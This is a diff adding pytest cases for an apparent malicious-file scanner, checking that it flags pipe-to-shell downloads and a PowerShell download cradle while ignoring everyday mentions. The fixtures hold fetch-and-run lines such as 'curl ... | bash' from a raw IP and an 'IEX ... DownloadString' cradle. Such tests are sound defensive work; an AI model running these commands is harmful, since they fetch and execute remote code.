@@ -1,4 +1,5 @@
 import json
+import os
 
 import pytest
 
@@ -106,4 +107,35 @@ def test_pipe_to_shell_from_raw_ip_is_suspicious(scanner, tmp_path):
     rep = scanner.scan_file(write(tmp_path, "setup.sh",
                                   b"#!/bin/sh\ncurl -s http://203.0.113.5:8080/x.sh | bash\n"))
     assert rep.verdict == "suspicious"
-    assert "Pipe-to-shell download" in titles(rep)
+    assert "Pipe-to-shell download from a raw IP address" in titles(rep)
+
+
+def test_install_instructions_in_a_readme_are_not_suspicious(scanner, tmp_path):
+    rep = scanner.scan_file(write(tmp_path, "README.md",
+                                  b"Install:\n\n    curl -fsSL https://example.com/install.sh | bash\n"))
+    assert "Pipe-to-shell download" in titles(rep)    # still noted ...
+    assert rep.verdict == "clean"                     # ... but not worth a verdict on its own
+
+
+@pytest.mark.parametrize("text", [
+    b"downloadFile is too big for this device\n",                      # browser UI string
+    b"syn keyword DownloadFile DOWNLOADFILE_STATUS Invoke-Expression\n",  # an editor's syntax list
+    b"set(download_file_script ${CMAKE_COMMAND} -P downloadfile.cmake)\n",
+    b"Use Invoke-Expression to run a string as a command.\n",
+])
+def test_everyday_mentions_do_not_trip_the_powershell_checks(scanner, tmp_path, text):
+    rep = scanner.scan_file(write(tmp_path, "doc.txt", text))
+    assert rep.verdict == "clean", titles(rep)
+
+
+def test_powershell_download_cradle_is_suspicious(scanner, tmp_path):
+    ps = b"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')\n"
+    rep = scanner.scan_file(write(tmp_path, "run.ps1", ps))
+    assert "PowerShell download cradle" in titles(rep)
+    assert rep.verdict == "suspicious"
+
+
+def test_random_bytes_do_not_match_text_patterns(scanner, tmp_path):
+    data = os.urandom(8000) + b"iex(" + os.urandom(8000)    # compressed or encrypted data looks like this
+    rep = scanner.scan_file(write(tmp_path, "blob.bin", data))
+    assert "PowerShell Invoke-Expression" not in titles(rep)
